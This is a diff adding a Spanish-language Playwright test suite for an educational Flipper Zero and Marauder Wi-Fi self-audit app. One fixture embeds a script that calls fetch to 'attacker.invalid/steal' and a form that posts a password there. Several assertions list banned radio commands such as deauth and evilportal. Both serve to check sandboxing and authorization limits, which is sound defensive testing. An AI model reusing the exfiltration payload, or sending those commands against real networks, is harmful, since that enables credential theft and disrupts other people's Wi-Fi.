@@ -1,0 +1,266 @@
+import {test,expect} from '@playwright/test';
+import {makeFakePort} from './fake-flipper.js';
+import {REPORT_SECTIONS} from '../src/history.js';
+import {makeMarauderPort} from './fake-marauder.js';
+
+test('portal importado bloquea scripts, red, enlaces y campos',async({page})=>{
+ const requests=[];page.on('request',r=>{if(r.url().includes('attacker.invalid'))requests.push(r.url());});
+ await page.goto('/');
+ await page.getByText('Inspeccionar otro archivo HTML').click();
+ await page.getByLabel('Seleccionar archivo HTML').setInputFiles({name:'prueba.html',mimeType:'text/html',buffer:Buffer.from('<html><body><script>top.__portalScriptRan=true;fetch("https://attacker.invalid/steal")</script><form action="https://attacker.invalid/"><input type="password" value="secret"><button>Enviar</button></form><img src="https://attacker.invalid/pixel"><a href="https://attacker.invalid/">Salir</a><style>body{background:url(https://attacker.invalid/css)}</style></body></html>')});
+ const frame=page.frameLocator('iframe');
+ await expect(frame.locator('input')).toBeDisabled();await expect(frame.locator('input')).toHaveAttribute('type','text');
+ await expect(frame.locator('script')).toHaveCount(0);await expect(frame.locator('a')).not.toHaveAttribute('href');
+ await expect(frame.locator('form')).not.toHaveAttribute('action');await expect(page.locator('iframe')).toHaveAttribute('sandbox','');
+ expect(await page.evaluate(()=>window.__portalScriptRan)).toBeUndefined();expect(requests).toEqual([]);
+});
+
+test('flujo USB con fixture: diagnóstico, carga, apertura y observación manual',async({page})=>{
+ await page.addInitScript(makeFakePort);await page.goto('/');
+ await expect(page.locator('.stepper .step.done')).toHaveCount(0);
+ await expect(page.getByRole('button',{name:'Reiniciar prueba'})).toHaveCount(0);
+ await page.getByRole('button',{name:'Conectar Flipper',exact:true}).click();
+ await expect(page.getByText('Identidad confirmada')).toBeVisible();
+ await expect(page.locator('.stepper .step.done')).toHaveCount(1);
+ await page.getByRole('button',{name:'Continuar con el portal'}).click();
+ const token=await page.getByTestId('test-token').textContent();
+ await page.getByLabel('Sufijo de la red').fill('Clase01');
+ await page.getByRole('button',{name:'Cargar prueba al Flipper'}).click();
+ await expect(page.getByText('Archivos cargados y leídos de vuelta')).toBeVisible();
+ await expect(page.locator('.stepper .step.done')).toHaveCount(2);
+ await expect(page.locator('.lab-grid').getByText('Firmware del ESP32')).toHaveCount(0);
+ await page.getByRole('button',{name:'Abrir en el Flipper'}).click();
+ await expect(page.getByText('Aplicación abierta. La red aún necesita Start portal.')).toBeVisible();
+ await page.getByRole('checkbox').check();await page.getByLabel('Código que muestra el portal en el móvil').fill('000000');
+ await page.getByRole('button',{name:'Registrar prueba'}).click();await expect(page.getByRole('alert')).toContainText('código');
+ await page.getByLabel('Código que muestra el portal en el móvil').fill(token);await page.getByRole('button',{name:'Registrar prueba'}).click();
+ await expect(page.getByRole('heading',{name:'Tu observación quedó registrada.'})).toBeVisible();
+ await expect(page.locator('.stepper .step.done')).toHaveCount(3);
+ expect(await page.evaluate(()=>JSON.parse(localStorage.getItem('semillero.practice-history.v1')).records.filter(record=>record.kind==='portal').length)).toBe(1);
+ const download=page.waitForEvent('download');await page.getByRole('button',{name:'Exportar registro',exact:true}).click();
+ expect((await download).suggestedFilename()).toBe('reporte-semillero.json');
+ const commands=await page.evaluate(()=>window.__fakePort.commands);
+ expect(commands.some(command=>command.startsWith('storage write_chunk'))).toBe(true);
+ expect(commands.some(command=>command.startsWith('loader open'))).toBe(true);
+ expect(commands.some(command=>/uart|deauth/.test(command))).toBe(false);
+ await page.getByRole('button',{name:'Reiniciar prueba'}).click();
+ await expect(page.getByRole('button',{name:'Conecta tu equipo: en curso'})).toHaveAttribute('aria-current','step');
+ await expect(page.locator('.stepper .step.done')).toHaveCount(0);
+ await expect(page.getByText('Sin conexión USB')).toBeVisible();
+ await expect(page.getByRole('button',{name:'Reiniciar prueba'})).toHaveCount(0);
+ await expect(page.getByText('Nueva prueba iniciada. Completa de nuevo los tres pasos del recorrido.')).toBeVisible();
+ await page.getByRole('button',{name:'Conectar Flipper',exact:true}).click();
+ await expect(page.locator('.stepper .step.done')).toHaveCount(1);
+ await page.getByRole('button',{name:'Continuar con el portal'}).click();
+ await expect(page.getByLabel('Sufijo de la red')).toHaveValue('Clase01');
+ await expect(page.getByTestId('test-token')).not.toHaveText(token);
+ await page.getByRole('button',{name:'Cargar prueba al Flipper'}).click();
+ await expect(page.locator('.stepper .step.done')).toHaveCount(2);
+ await expect(page.getByRole('checkbox')).not.toBeChecked();
+ await expect(page.getByLabel('Código que muestra el portal en el móvil')).toHaveValue('');
+});
+
+test('simulación tiene eventos identificados y funciona sin conexión',async({page})=>{
+ await page.goto('/');await page.getByRole('button',{name:'Simulación',exact:true}).click();
+ await page.getByRole('button',{name:'Iniciar simulación'}).click();
+ await expect(page.getByText('Práctica finalizada. No se emitieron señales Wi-Fi.')).toBeVisible({timeout:10000});
+ await expect(page.getByText('Recorrido completado.')).toBeVisible();
+ await page.getByRole('button',{name:'Historial y PDF',exact:true}).click();
+ await expect(page.locator('.history-card')).toContainText('Simulación: portal de bienvenida');
+});
+
+test('móvil sin desbordamiento, ayuda accesible y rechazo de archivo inválido',async({page})=>{
+ await page.setViewportSize({width:390,height:844});await page.goto('/');
+ expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
+ await page.getByRole('button',{name:'Ayuda y conexión'}).click();await expect(page.getByRole('dialog')).toBeVisible();
+ await page.keyboard.press('Escape');await expect(page.getByRole('dialog')).not.toBeVisible();
+ await page.getByText('Inspeccionar otro archivo HTML').click();
+ await page.getByLabel('Seleccionar archivo HTML').setInputFiles({name:'texto.txt',mimeType:'text/plain',buffer:Buffer.from('hola')});
+ await expect(page.getByRole('alert')).toContainText('Selecciona un archivo');
+ await page.getByRole('button',{name:/Prepara el portal/}).click();
+ await expect(page.getByRole('button',{name:'Cargar prueba al Flipper'})).toBeDisabled();
+});
+
+test('analizador local, historial persistente y PDF con selección previa',async({page},testInfo)=>{
+ const requests=[];page.on('request',request=>{if(request.url().includes('.invalid'))requests.push(request.url());});
+ await page.goto('/');await page.getByRole('button',{name:'Analizar HTML',exact:true}).click();
+ await page.getByLabel('Nombre del archivo o ejercicio').fill('Auditoria-UNO.html');
+ await page.getByLabel('URL donde se sirve la página (opcional)').fill('https://lab.example.invalid/pagina/');
+ await page.getByLabel('Código HTML original').fill(`<!doctype html>
+<form action="http://forms.example.invalid/enviar" method="post">
+<input type="email" value="NO-PERSISTIR-VALOR">
+</form>
+<script src="https://recurso-excluido.example.invalid/app.js"></script>
+<script>window.__analysisExecuted=true;</script>`);
+ await page.locator('.analyzer-run').getByRole('button',{name:'Analizar HTML'}).click();
+ await expect(page.getByText('Análisis guardado en el historial.')).toBeVisible();
+ await expect(page.locator('.finding-card')).not.toHaveCount(0);
+ await page.locator('.finding-card').first().getByRole('button',{name:'Ver línea 2'}).click();
+ await expect(page.locator('.code-lines .highlighted')).toContainText('http://forms.example.invalid/enviar');
+ expect(await page.evaluate(()=>window.__analysisExecuted)).toBeUndefined();expect(requests).toEqual([]);
+ await page.getByLabel('Nombre del archivo o ejercicio').fill('Auditoria-DOS.html');
+ await page.getByLabel('Código HTML original').fill('<p>Práctica no seleccionada MARCADOR-DOS</p>');
+ await page.locator('.analyzer-run').getByRole('button',{name:'Analizar HTML'}).click();
+ await page.reload();await page.getByRole('button',{name:'Historial y PDF',exact:true}).click();
+ await expect(page.locator('.history-card')).toHaveCount(2);
+ await expect(page.getByRole('button',{name:'Descargar PDF seleccionado'})).toBeDisabled();
+ expect(await page.evaluate(()=>localStorage.getItem('semillero.practice-history.v1'))).not.toContain('NO-PERSISTIR-VALOR');
+ await page.getByRole('checkbox',{name:'Seleccionar Análisis: Auditoria-UNO.html',exact:true}).check();
+ for(const label of ['Resumen de la práctica','Equipo y datos de la prueba','Eventos del registro','Recursos y enlaces','Conexiones HTTP','Hallazgos y explicación','Recomendaciones']) await page.getByRole('checkbox',{name:label,exact:true}).uncheck();
+ await page.getByLabel('Título del informe').fill('Informe de selección');
+ await page.getByLabel('Nombre o equipo (opcional)').fill('Semillero de prueba');
+ await expect(page.locator('.report-preview')).toContainText('Auditoria-UNO');
+ await expect(page.locator('.report-preview')).not.toContainText('Auditoria-DOS');
+ const downloaded=page.waitForEvent('download');await page.getByRole('button',{name:'Descargar PDF seleccionado'}).click();
+ const pdf=await downloaded;expect(pdf.suggestedFilename()).toBe('historial-semillero.pdf');await pdf.saveAs(testInfo.outputPath('historial-seleccion.pdf'));
+ await expect(page.getByText('PDF generado con tu selección.')).toBeVisible();
+ await page.getByRole('button',{name:'Eliminar seleccionadas del historial'}).click();await expect(page.locator('.history-card')).toHaveCount(1);
+ await page.getByRole('button',{name:'Deshacer eliminación (1)'}).click();await expect(page.locator('.history-card')).toHaveCount(2);
+ await page.setViewportSize({width:390,height:844});expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
+});
+
+test('auditoría con apertura USB, importación, plan e informe de red seleccionable',async({page},testInfo)=>{
+ await page.addInitScript(makeFakePort);await page.goto('/');
+ await page.getByRole('button',{name:'Auditar red',exact:true}).click();
+ await page.getByRole('button',{name:'Revisión manual (opcional)',exact:true}).click();
+ await expect(page.getByRole('region',{name:'Guía de AIO Board V1.4'})).toContainText('Modelo indicado por ti');
+ await expect(page.getByRole('region',{name:'Guía de AIO Board V1.4'})).toContainText('indicador verde');
+ await page.getByRole('button',{name:'Conectar Flipper',exact:true}).click();
+ await expect(page.getByRole('button',{name:'Abrir Marauder',exact:true})).toBeEnabled();
+ await expect(page.locator('.network-apps')).toContainText('Aplicación en microSD · lectura USB');
+ await page.getByRole('button',{name:'Abrir Marauder',exact:true}).click();
+ await expect(page.getByRole('status')).toContainText('escaneo aún no se ha iniciado');
+ await page.getByLabel('Firmware del ESP32 / método de lectura').selectOption('marauder');
+ await page.getByRole('checkbox',{name:'Confirmé que Marauder responde en mi Flipper y usaré mi propia red.'}).check();
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ await page.getByText('Importar observaciones CSV o texto',{exact:true}).click();
+ await page.getByLabel('Importar registro de red').setInputFiles({name:'scan.csv',mimeType:'text/csv',buffer:Buffer.from('SSID,BSSID,Channel,RSSI,Security\nCasa-QA,AA:BB:CC:DD:EE:02,6,-60,WEP\nVecino-NO-GUARDAR,11:22:33:44:55:66,11,-80,OPEN')});
+ await page.getByLabel('Selecciona tu punto de acceso (2)').selectOption('0');
+ await expect(page.getByLabel('Nombre de tu red (SSID)')).toHaveValue('Casa-QA');
+ await page.getByText('Comparar identidad e historial',{exact:true}).click();
+ await page.getByLabel('BSSID de referencia confirmados en tu router (opcional)').fill('AA:BB:CC:DD:EE:01');
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ for(const [id,value] of Object.entries({wps:'on',updates:'pending',admin:'default',password:'weak',remote:'on',upnp:'on',isolation:'shared'}))await page.locator(`#router-${id}`).selectOption(value);
+ await page.getByRole('checkbox',{name:'Revisé estos apartados y dejé sin confirmar lo que no pude comprobar.'}).check();
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ await expect(page.locator('.network-finding').first()).toContainText('Protección Wi-Fi insuficiente');
+ await expect(page.locator('.network-comparison')).toContainText('no demuestra una suplantación');
+ await page.getByRole('checkbox',{name:'Acción declarada realizada: WPS está activado',exact:true}).check();
+ await page.getByRole('button',{name:'Guardar revisión en historial',exact:true}).click();
+ await expect(page.getByRole('status')).toContainText('Revisión guardada');
+ const stored=await page.evaluate(()=>localStorage.getItem('semillero.practice-history.v1'));
+ expect(stored).not.toContain('Vecino-NO-GUARDAR');expect(JSON.parse(stored).records[0].network.actions.wps).toBe(true);
+ const commands=await page.evaluate(()=>window.__fakePort.commands);expect(commands.some(command=>command.includes('esp32_wifi_marauder.fap')&&command.startsWith('loader open'))).toBe(true);
+ expect(commands.some(command=>/uart|deauth|scanap|storage (write|rename|remove)/.test(command))).toBe(false);
+ await page.setViewportSize({width:390,height:844});expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
+ await page.screenshot({path:testInfo.outputPath('red-movil.png'),fullPage:true});
+ await page.setViewportSize({width:1440,height:1000});await page.screenshot({path:testInfo.outputPath('red-escritorio.png'),fullPage:true});
+ await page.getByRole('button',{name:'Nueva revisión',exact:true}).click();
+ await expect(page.locator('.network-stepper button.done')).toHaveCount(0);
+ await page.getByRole('checkbox',{name:'Confirmé que Marauder responde en mi Flipper y usaré mi propia red.'}).check();
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ await page.getByLabel('Nombre de tu red (SSID)').fill('Casa-QA');await page.getByLabel('BSSID del punto de acceso (opcional)').fill('AA:BB:CC:DD:EE:02');
+ await page.getByLabel('Seguridad observada / confirmada').selectOption('wpa3');
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ await page.getByRole('checkbox',{name:'Revisé estos apartados y dejé sin confirmar lo que no pude comprobar.'}).check();
+ await page.getByRole('button',{name:'Continuar',exact:true}).click();
+ await expect(page.locator('.network-comparison')).toContainText('WEP → WPA3');
+ await expect(page.locator('.network-pending')).toContainText('7 comprobaciones pendientes');
+ await page.reload();await page.getByRole('button',{name:'Historial y PDF',exact:true}).click();
+ await page.getByRole('checkbox',{name:'Seleccionar Red: Casa-QA',exact:true}).check();
+ for(const [id,label] of REPORT_SECTIONS) if(!['network','findings','plan','code'].includes(id))await page.getByRole('checkbox',{name:label,exact:true}).uncheck();
+ const downloadPromise=page.waitForEvent('download');await page.getByRole('button',{name:'Descargar PDF seleccionado'}).click();
+ await (await downloadPromise).saveAs(testInfo.outputPath('red-seleccion.pdf'));
+ await expect(page.getByText('PDF generado con tu selección.')).toBeVisible();
+});
+
+test('diagnóstico directo sin formulario de router, USB separado, parada y PDF sin clave',async({page},testInfo)=>{
+ await page.addInitScript(makeMarauderPort);await page.goto('/');
+ await page.getByRole('button',{name:'Auditar red',exact:true}).click();
+ await expect(page.getByRole('button',{name:'Diagnóstico con Flipper',exact:true})).toHaveAttribute('aria-pressed','true');
+ await expect(page.getByRole('button',{name:'Conectar Flipper',exact:true})).not.toBeVisible();
+ await expect(page.getByLabel('WPS',{exact:true})).not.toBeVisible();
+ await page.getByRole('button',{name:'Conectar Marauder',exact:true}).click();
+ await expect(page.getByText('Marauder respondió por el puente USB-UART')).toBeVisible();
+ await page.getByRole('button',{name:'Escanear redes',exact:true}).click();
+ await page.getByRole('radio',{name:/Casa de prueba/}).check();
+ const radioBox=await page.getByRole('radio',{name:/Casa de prueba/}).boundingBox();expect(radioBox.width).toBeLessThanOrEqual(24);
+ await expect(page.locator('.direct-results')).toBeVisible();
+ await expect(page.locator('.direct-flow .done')).toHaveCount(2);
+ expect(await page.evaluate(()=>window.__marauderPort.commands.some(c=>/^(join|pingscan|portscan)/.test(c)))).toBe(false);
+ await page.getByRole('button',{name:'Es mi red y autorizo revisar sus equipos'}).click();
+ await page.getByLabel('Clave de tu Wi-Fi para conectar la AIO').fill('CLAVE-SOLO-ESP32');
+ await page.getByRole('button',{name:'Conectar y continuar automáticamente',exact:true}).click();
+ await expect(page.getByText('Diagnóstico guardado en el historial.',{exact:false})).toBeVisible();
+ await expect(page.getByLabel('Clave de tu Wi-Fi para conectar la AIO')).toHaveCount(0);
+ await expect(page.locator('.direct-results')).toContainText('Puerto asociado a Telnet accesible');
+ await expect(page.locator('.direct-tests')).toContainText('Cobertura parcial');
+ await page.setViewportSize({width:390,height:844});expect(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth)).toBe(true);
+ await page.screenshot({path:testInfo.outputPath('automatico-movil.png'),fullPage:true});
+ await page.setViewportSize({width:1440,height:1000});await page.screenshot({path:testInfo.outputPath('automatico-escritorio.png'),fullPage:true});
+ const records=await page.evaluate(()=>JSON.parse(localStorage.getItem('semillero.practice-history.v1')).records);
+ expect(JSON.stringify(records)).not.toContain('CLAVE-SOLO-ESP32');expect(JSON.stringify(records)).not.toContain('Vecino-EXCLUIR');expect(JSON.stringify(records)).not.toContain('203.0.113.20');
+ expect(records[0].network.automatic.services).toHaveLength(5);
+ expect(records).toHaveLength(1);expect(records[0].network.automatic.accessValidation.status).toBe('observed');
+ expect(await page.evaluate(()=>localStorage.getItem('semillero.authorized-networks.v1'))).not.toContain('CLAVE-SOLO-ESP32');
+ const commands=await page.evaluate(()=>window.__marauderPort.commands);expect(commands.some(command=>command.startsWith('join -a 8 -p '))).toBe(true);expect(commands.some(command=>/attack|evilportal|deauth|reboot|update/.test(command))).toBe(false);
+ expect(commands.filter(command=>command==='list -a')).toHaveLength(1);
+ await page.getByRole('button',{name:'Probar portal',exact:true}).click();await page.getByRole('button',{name:'Conectar Flipper',exact:true}).click();
+ await expect(page.getByRole('alert')).toContainText('Desconecta Marauder');
+ await page.getByRole('button',{name:'Historial y PDF',exact:true}).click();
+ await page.getByRole('checkbox',{name:'Seleccionar Diagnóstico automático: Casa de prueba',exact:true}).check();
+ const download=page.waitForEvent('download');await page.getByRole('button',{name:'Descargar PDF seleccionado'}).click();await (await download).saveAs(testInfo.outputPath('automatico-seleccion.pdf'));
+ await expect(page.getByText('PDF generado con tu selección.')).toBeVisible();
+});
+
+test('firmware real v1.5 anuncia escaneo y deja LAN deshabilitada sin pedir clave',async({page})=>{
+ await page.addInitScript(makeMarauderPort,{oldFirmware:true});await page.goto('/');await page.getByRole('button',{name:'Auditar red',exact:true}).click();
+ await page.getByRole('button',{name:'Conectar Marauder',exact:true}).click();
+ await expect(page.getByText('Marauder respondió por el puente USB-UART · v1.5.0')).toBeVisible();
+ await expect(page.getByLabel('Clave de tu Wi-Fi para conectar la AIO')).toHaveCount(0);
+ await expect(page.getByText('El escaneo y la lectura del AP siguen disponibles;',{exact:false})).toBeVisible();
+ await page.getByRole('button',{name:'Escanear redes',exact:true}).click();await page.getByRole('radio',{name:/Casa de prueba/}).check();
+ await expect(page.locator('.direct-results')).toBeVisible();
+ await page.getByRole('button',{name:'Es mi red y autorizo revisar sus equipos'}).click();
+ await expect(page.locator('.direct-validation')).toContainText('No compatible');
+ await expect(page.getByLabel('Clave de tu Wi-Fi para conectar la AIO')).toHaveCount(0);
+ expect(await page.evaluate(()=>window.__marauderPort.commands.some(c=>c.startsWith('join')||c.startsWith('portscan')))).toBe(false);
+});
+
+test('fallo de conexión muestra el diagnóstico pendiente y permite reintentar sin guardar la clave',async({page})=>{
+ await page.addInitScript(makeMarauderPort,{joinFailed:true,security:'WPA2',wps:'No informado',pmf:'No informado'});await page.goto('/');
+ await page.getByRole('button',{name:'Auditar red',exact:true}).click();
+ await page.getByRole('button',{name:'Conectar Marauder',exact:true}).click();
+ await page.getByRole('button',{name:'Escanear redes',exact:true}).click();
+ await page.getByRole('radio',{name:/Casa de prueba/}).check();
+ await page.getByRole('button',{name:'Es mi red y autorizo revisar sus equipos'}).click();
+ await page.getByLabel('Clave de tu Wi-Fi para conectar la AIO').fill('CLAVE*DE-PRUEBA');
+ await page.getByRole('button',{name:'Conectar y continuar automáticamente',exact:true}).click();
+ await expect(page.locator('.direct-validation')).toContainText('La AIO no se conectó a la red');
+ await expect(page.locator('.direct-results')).toContainText('El firmware no informa la causa exacta');
+ await expect(page.locator('.direct-results')).toContainText('No se ejecutaron las pruebas de equipos ni puertos');
+ await expect(page.locator('.direct-results')).toContainText('todavía no hay resultados de equipos ni puertos');
+ await expect(page.locator('.direct-flow .done')).toHaveCount(2);
+ await expect(page.getByLabel('Clave de tu Wi-Fi para conectar la AIO')).toHaveValue('');
+ const record=await page.evaluate(()=>JSON.parse(localStorage.getItem('semillero.practice-history.v1')).records[0]);
+ expect(record.status).toBe('Prueba de LAN inconclusa');
+ expect(record.summary).toContain('equipos y puertos sin evaluar');
+ expect(JSON.stringify(record)).not.toContain('CLAVE*DE-PRUEBA');
+ expect(await page.evaluate(()=>window.__marauderPort.commands.some(c=>/^(pingscan|portscan)/.test(c)))).toBe(false);
+});
+
+test('perfil recordado activa LAN solo para BSSID autorizado y otra red recibe solo lectura',async({page})=>{
+ await page.addInitScript(makeMarauderPort,{security:'Open'});await page.goto('/');
+ await page.getByRole('button',{name:'Auditar red',exact:true}).click();await page.getByRole('button',{name:'Conectar Marauder',exact:true}).click();
+ await page.getByRole('button',{name:'Escanear redes',exact:true}).click();await page.getByRole('radio',{name:/Casa de prueba/}).check();
+ await expect(page.locator('.direct-validation')).toContainText('Solo lectura inalámbrica');
+ await page.getByRole('button',{name:'Es mi red y autorizo revisar sus equipos'}).click();await expect(page.locator('.direct-validation')).toContainText('Conexión autorizada observada');
+ await page.reload();await page.getByRole('button',{name:'Auditar red',exact:true}).click();await page.getByRole('button',{name:'Conectar Marauder',exact:true}).click();
+ await page.getByRole('button',{name:'Escanear redes',exact:true}).click();await page.getByRole('radio',{name:/Casa de prueba/}).check();
+ await expect(page.locator('.direct-validation')).toContainText('Conexión autorizada observada');
+ await page.getByRole('radio',{name:/Vecino-EXCLUIR/}).check();await expect(page.locator('.direct-validation')).toContainText('Solo lectura inalámbrica');
+ expect(await page.evaluate(()=>window.__marauderPort.commands.some(c=>c.startsWith('join -a 9')))).toBe(false);
+ await page.getByRole('radio',{name:/Casa de prueba/}).check();await expect(page.locator('.direct-validation')).toContainText('Conexión autorizada observada');
+ await page.getByRole('button',{name:'Olvidar autorización de esta red'}).click();await expect(page.locator('.direct-validation')).toContainText('Solo lectura inalámbrica');
+ expect(await page.evaluate(()=>JSON.parse(localStorage.getItem('semillero.authorized-networks.v1')).profiles)).toHaveLength(0);
+});
